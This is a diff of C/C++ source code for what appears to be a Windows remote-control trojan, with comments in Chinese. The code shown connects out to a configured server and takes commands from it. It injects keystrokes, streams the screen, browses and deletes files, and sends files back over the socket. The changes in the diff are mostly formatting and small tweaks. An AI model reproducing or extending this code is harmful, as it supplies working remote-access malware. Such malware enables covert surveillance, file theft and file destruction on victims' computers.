@@ -47,13 +47,13 @@ struct MODIFY_DATA
 
 SOCKET MainSocket;
 
-inline unsigned long _stdcall resolve(char *host)
+unsigned long _stdcall resolve(char *host)
 {
     struct hostent *ser = NULL;
 
 	long i = inet_addr(host);
 	
-    if (i < 0)
+    if (i < 0) //Not Ip
     {
 		ser = (struct hostent*)gethostbyname(host);
 
@@ -87,7 +87,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	int timeout = 45000;
 	int err = setsockopt(MainSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
   		
-    if (connect(MainSocket,(PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
+    if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
     {
         MsgErr("Can't Connect");
 #ifndef DE
@@ -120,7 +120,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
     {
         MsgErr("Can't Send");
         closesocket(MainSocket);
-        return 1;//send socket type error
+        return 1; //send socket type error
     }
 
     while (1)	//接收命令
@@ -250,7 +250,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			{
 			    //OpenUserDesktop();
 			    int nVirtKey = msgHead.dwExtend1;
-			    keybd_event((BYTE)nVirtKey,0,0,0);
+			    keybd_event((BYTE)nVirtKey, 0, 0, 0);
 			}
 			break;
 
@@ -346,7 +346,7 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 
     //================================================================================
     MsgHead msgHead;
-    char *chBuffer = new char[1536 * 1024]; //数据交换区 1.5MB
+    char *chBuffer = new char[2048 * 1024]; //数据交换区
 
     //send socket type
     msgHead.dwCmd = SOCKET_FILEMANAGE;
@@ -374,12 +374,12 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 				FileListDirver(chBuffer, &msgHead);
 			}
 			break;
-        case CMD_FILEDIRECTORY://获取文件夹
+        case CMD_FILEDIRECTORY:
 			{
 				FileListDirectory(chBuffer, &msgHead);
 			}
 			break;
-        case CMD_FILEDELETE://删除
+        case CMD_FILEDELETE:
 			{
 				FileDelete(chBuffer, &msgHead);
 			}
@@ -443,14 +443,14 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
     closesocket(FileSocket);
     return 0;
 }
-///////////////////////////////////////////////////////////////////////////////////
+
 DWORD _stdcall ScreenThread(LPVOID lParam)
 {	
     DWORD dwSock = (DWORD)lParam;
 
     struct sockaddr_in LocalAddr;
-    LocalAddr.sin_family=AF_INET;
-    LocalAddr.sin_port=htons(modify_data.ServerPort);
+    LocalAddr.sin_family = AF_INET;
+    LocalAddr.sin_port = htons(modify_data.ServerPort);
     LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);
 
     //屏幕监控的socket
@@ -469,7 +469,6 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
         setsockopt(ScreenSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法   
     }
 
-    //稍微降低进程优先级
     SetThreadPriority( GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL );
 
     MsgHead msgHead;
@@ -855,10 +854,9 @@ DWORD _stdcall FileDownThread(LPVOID lParam)
             if ( !MyReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL) )
                 break;
         }
-        else
-        {
-            if ( !ReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL) )
-                break;
+        else if ( !ReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL) )
+		{
+			break;
         }
 
         if ( send(FileSocket, (char*)&SendBuffer, dwBytes, 0) <= 0 )
@@ -870,7 +868,7 @@ DWORD _stdcall FileDownThread(LPVOID lParam)
         FreeLibrary(hInst);
         
     CloseHandle(hDownFile);
-    shutdown(FileSocket,0x02);
+    shutdown(FileSocket, 0x02);
     closesocket(FileSocket);
 
     return 10;
@@ -960,7 +958,9 @@ int WINAPI WinMain(HINSTANCE hInstance,
                    LPSTR     lpCmdLine,
                    int       nCmdShow)
 {
+#ifdef LxScreem
 	OpenUserDesktop();
+#endif
 
 #ifdef Lxform
     HWND hwnd = CreateWindowExW(
